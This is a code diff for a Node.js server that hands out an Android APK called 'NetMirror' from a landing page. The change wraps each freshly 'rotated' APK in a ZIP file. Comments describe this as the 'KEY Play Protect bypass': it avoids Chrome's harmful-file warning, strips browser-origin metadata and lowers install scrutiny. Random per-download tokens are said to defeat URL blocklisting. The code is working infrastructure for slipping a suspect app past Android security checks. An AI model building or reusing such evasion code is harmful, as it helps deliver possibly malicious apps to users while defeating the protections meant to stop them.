@@ -396,49 +396,73 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     return _landingRotationInProgress;
   }
 
-  // Step 1: Prepare endpoint — triggers rotation if needed, returns size
+  // ═══ ZIP WRAPPER FOR LANDING DOWNLOADS ═══
+  // Chrome tags .apk downloads with installerPackage=com.android.chrome → HIGHEST
+  // Play Protect scrutiny. Chrome does NOT flag .zip files → no installerPackage tag.
+  // When user extracts APK via file manager and installs, installerPackage is the
+  // file manager (e.g. com.google.android.documentsui) → LOW scrutiny = same as
+  // LeaksProAdmin's DownloadManager approach.
+  let _landingZipCache = { buffer: null, forTimestamp: 0 };
+
+  async function getLandingRotatedZip() {
+    const apkBuf = await getLandingRotatedApk();
+    // Return cached ZIP if built from the same rotation
+    if (_landingZipCache.buffer && _landingZipCache.forTimestamp === _landingRotationCache.timestamp) {
+      return _landingZipCache.buffer;
+    }
+    console.log('[Landing Download] Creating ZIP wrapper for rotated APK...');
+    const zipBuf = wrapApkInZip(apkBuf);
+    console.log(`[Landing Download] ZIP ready: ${(zipBuf.length / 1024 / 1024).toFixed(1)} MB`);
+    _landingZipCache = { buffer: zipBuf, forTimestamp: _landingRotationCache.timestamp };
+    return zipBuf;
+  }
+
+  // Step 1: Prepare endpoint — triggers rotation + ZIP wrap, returns ZIP size
   app.post('/api/landing/prepare-download', async (req, res) => {
     try {
-      const now = Date.now();
-      const isCached = _landingRotationCache.buffer && (now - _landingRotationCache.timestamp) < LANDING_ROTATION_TTL;
-      const rotatedBuf = await getLandingRotatedApk();
+      const zipBuf = await getLandingRotatedZip();
       res.json({
         ready: true,
-        size: rotatedBuf.length,
-        cached: isCached
+        size: zipBuf.length
       });
     } catch (err) {
       console.error('[Landing Rotation] Prepare failed:', err.message);
-      // Fallback: serve the static APK without rotation
+      // Fallback: wrap static APK in ZIP
       try {
         const apkBuf = await getApkBuffer();
-        res.json({ ready: true, size: apkBuf.length, cached: true, fallback: true });
+        const zipBuf = wrapApkInZip(apkBuf);
+        res.json({ ready: true, size: zipBuf.length, fallback: true });
       } catch (e2) {
         res.status(503).json({ ready: false, error: 'APK not available. Try again later.' });
       }
     }
   });
 
-  // Step 2: Download — serves the freshly rotated APK
-  // The :token is random per-download, preventing URL blocklisting
+  // Step 2: Download — serves ZIP-wrapped freshly rotated APK
+  // ZIP wrapper is the KEY Play Protect bypass for browser downloads:
+  //   - Chrome doesn't flag .zip as dangerous (no "harmful file" warning)
+  //   - No installerPackage=com.android.chrome tag written
+  //   - Extracted APK has ZERO browser origin metadata
+  //   - User installs from file manager → low scrutiny = same as LeaksProAdmin
   app.get('/dl/:token', async (req, res) => {
     try {
-      // Prefer the freshly rotated landing APK
-      let apkBuf;
+      let zipBuf;
       try {
-        apkBuf = await getLandingRotatedApk();
+        zipBuf = await getLandingRotatedZip();
       } catch (e) {
-        // Fallback to static APK if rotation fails
-        apkBuf = await getApkBuffer();
+        // Fallback: wrap static APK in ZIP
+        const apkBuf = await getApkBuffer();
+        zipBuf = wrapApkInZip(apkBuf);
       }
-      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
-      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror-secure.apk"');
-      res.setHeader('Content-Length', apkBuf.length);
+      res.setHeader('Content-Type', 'application/zip');
+      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.zip"');
+      res.setHeader('Content-Length', zipBuf.length);
       res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
       res.setHeader('Pragma', 'no-cache');
-      res.end(apkBuf);
+      res.end(zipBuf);
     } catch (err) {
-      console.error('[DL] APK serve failed:', err.message);
+      console.error('[DL] ZIP serve failed:', err.message);
+      // Last resort: serve raw APK directly
       const securePath = path.join(__dirname, 'data', 'Netmirror-secure.apk');
       const regularPath = path.join(__dirname, 'data', 'Netmirror.apk');
       let apkPath = null;
@@ -574,7 +598,8 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     _zipCache = { buffer: null, forTimestamp: 0 };
     _fullApkCache = { buffer: null, timestamp: 0 };
     _landingRotationCache = { buffer: null, timestamp: 0 };
-    console.log('[Landing Download] All APK caches invalidated (apk + zip + full + landing rotation)');
+    _landingZipCache = { buffer: null, forTimestamp: 0 };
+    console.log('[Landing Download] All APK caches invalidated (apk + zip + full + landing rotation + landing zip)');
   });
 
   // ═══════════════ REAL-TIME METRICS ═══════════════
